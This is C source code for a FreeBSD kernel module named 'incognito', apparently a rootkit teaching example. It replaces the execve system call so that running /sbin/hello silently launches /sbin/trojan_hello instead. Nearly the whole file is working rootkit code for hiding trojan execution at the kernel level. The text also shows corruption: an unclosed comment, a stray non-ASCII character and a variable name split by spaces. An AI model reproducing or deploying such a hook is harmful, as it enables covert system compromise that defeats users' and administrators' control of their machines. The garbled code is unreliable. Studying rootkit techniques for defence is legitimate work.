#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#define ORIGINAL "/sbin/hello"
#define TROJAN "/sbin/trojan_hello"
/*
* execve system call hook.
* Redirects the execution of ORIGINAL into TROJAN.
static int
execve_hook(struct thread *td, void *syscall_args)
{
    struct execve_args /* {
        char *fname;
        char **argv;
        char **envv;
     } */ *uap;
uap = (struct execve_args *)syscall_args;
struct execve_args kernel_ea;
struct execve_args *user_ea;
struct vmspace *vm;
vm_offset_t base, addr;
char t_fname[] = TROJAN;
/* Redirect this process? */
if (strcmp(uap->fname, ORIGINAL) == 0) {
/*
* Determine the end boundary address of the current
* process's user data space.
*/
    vm = curthread->td_proc->p_vmspace;
    base = round_page((vm_offset_t) vm->vm_daddr);
    􀀀addr = base + ctob(vm->vm_dsize);
/*
* Allocate a PAGE_SIZE null region of memory for a new set
* of execve arguments.
*/
        vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
        VM_PROT_ALL, VM_PROT_ALL, 0);
    v   m->vm_dsize += btoc(PAGE_SIZE);
/*
* Set up an execve_args structure for TROJAN. Remember, you
* have to place this structure into user space, and because
* you can't point to an element in kernel space once you are
* in user space, you'll have to place any new "arrays" that
* this structure points to in user space as well.
*/
        copyout(&t_fname, (char *)addr, strlen(t_fname));
        kernel_ea.fname = (char *)addr;
        kernel_ea.argv = uap->argv;
        kernel_ea.envv = uap->envv;
/* Copy out the TROJAN execve_args structure. */
        user_ea = (struct execve_args *)addr + sizeof(t_fname);
        copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
/* Execute TROJAN. */
        return(execve(curthread, user_ea));
    }
    return(execve(td, syscall_args));
}
/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
    sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
    return(0);
}
static moduledata_t incognito_mod = {
    "incognito", /* module name */
    load, /* event handler */
    NULL /* extra data */
};
DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
